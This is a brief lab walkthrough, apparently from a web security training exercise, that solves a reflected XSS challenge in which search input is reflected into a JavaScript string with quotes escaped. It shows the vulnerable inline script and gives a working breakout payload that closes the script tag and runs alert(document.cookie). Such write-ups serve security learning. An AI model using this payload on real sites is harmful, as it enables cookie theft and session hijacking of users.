
# Reflected XSS into a JavaScript string with single quote and backslash escaped

Solution:
- The search string is present in an inline script as shown below:
```html
<script>
var searchTerms = 'test';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');               
</script>
```
- Our input is single quote escaped with a backslash
- Try escaping the script block entirely with a `</script>` tag
- Notice that we can successfully escape from the script tag
- Use this payload
```html
</script><script>alert(document.cookie)</script>
```

